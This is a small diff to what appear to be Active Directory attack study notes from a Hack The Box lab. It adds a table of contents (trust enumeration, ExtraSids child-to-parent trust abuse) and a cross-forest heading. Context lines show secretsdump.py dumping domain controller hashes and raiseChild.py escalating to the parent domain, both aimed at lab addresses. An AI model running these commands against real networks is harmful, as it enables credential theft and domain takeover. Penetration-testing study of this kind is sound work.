@@ -1,3 +1,8 @@
+# Content
+- [Enumerating Trust Relationships](#enumerating-trust-relationships)
+- [From child to parent Trusts Abuse](#from-child-to-parent-trusts-abuse)
+  - [ExtraSids Attack](#extrasids-attack)
+- []()
 
 # Enumerating Trust Relationships
 
@@ -153,3 +158,5 @@ secretsdump.py inlanefreight.local/administrator@172.16.5.5 -just-dc -hashes aad
 # the ip of parent DC then the child domain user
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
+
+# Cross-Forest Trust Abuse
